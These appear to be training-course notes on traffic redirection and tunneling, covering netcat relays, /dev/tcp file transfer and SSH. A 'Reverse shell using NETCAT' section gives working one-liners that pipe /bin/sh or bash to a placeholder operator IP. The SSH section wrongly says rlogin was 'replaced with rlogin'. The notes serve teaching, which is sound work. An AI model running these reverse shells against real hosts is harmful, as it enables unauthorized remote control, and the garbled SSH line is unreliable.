SCP

Secure Copy Protocol

    TCP Transport (TCP port 22)

    Uses symmetric and asymmetric encryption

    Authentication through sign in (username and password) or with SSH key

    Non Interactive

SKILL CCNE012: Traffic Redirection

    CCNE012.001 Discuss use cases for traffic redirection

    CCNE012.002 Perform traffic redirection using tools and native commands

NETCAT Relay Demos

On Client Relay:

mknod mypipe p
nc 10.1.0.2 9002 0< mypipe | nc 10.2.0.2 9001 1> mypipe

On Listener2 (sends info):

nc -l -p 9002 < infile.txt

On Listener1 (receives info):

nc -l -p 9001 > outfile.txt

Writes the output to listener1 and listener2 through the named pipe
File Transfer with /dev/tcp

On the receiving box:

nc -l -p 1111 > file.txt

On the sending box:

cat file.txt > /dev/tcp/10.2.0.2/1111

This method is useful for host that does not have NETCAT available.
Reverse shell using NETCAT

When shelled into the remote host using -c :

nc -c /bin/sh <your ip> <any unfiltered port>

You could even pipe BASH through NETCAT.

/bin/sh | nc <your ip> <any unfiltered port>

Then listen for the shell.

nc -l -p <same unfiltered port> -vvv

You can also listen using the -e with NETCAT.

nc -l -p <any unfiltered port> -e /bin/bash

CCNE011: Network Tunneling

    CCNE011.001 Understand the SSH tunneling process

    CCNE011.002 Explain the purpose and process of multi-hop tunneling

    CCNE011.003 Perform SSH local, remote, and dynamic port forwarding

    CCNE011.004 Evaluate tunnel diagrams

SSH

    Various Implementations (v1 and v2)

    Provides authentication, encryption, and integrity.

    Allows remote terminal sessions

    Used for tunneling

    Created as a secure replacement for Berkeley Remote commands:

        rsh - replaced with ssh, provides a channel for running a shell on a remote computer.

        rlogin - replaced with rlogin, provides remote login capability.

        rcp - replaced with scp for secure file transfer

    sftp (not a unix r command replacement) - creates remote directory listing and file transfer capability over SSH
